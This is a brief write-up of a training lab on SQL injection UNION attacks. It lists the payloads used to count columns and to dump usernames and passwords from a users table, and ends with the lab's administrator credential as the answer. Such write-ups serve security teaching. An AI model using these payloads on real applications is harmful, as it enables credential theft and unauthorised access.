# Lab: SQL injection UNION attack, retrieving data from other tables

**End Goal:** Perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the ```administrator``` user.

**Analysis**

*Check how many columns are there.*

' UNION SELECT NULL-- -

*Returns error*

' UNION SELECT NULL, NULL-- -

*Did not return errors so 2 columns in total.The database contains a different table called ```users```, with columns called ```username``` and ```password```.*

' UNION SELECT username, password FROM users-- -


**Answer:** 

administrator
eqlyl5l23qtam2935ibt
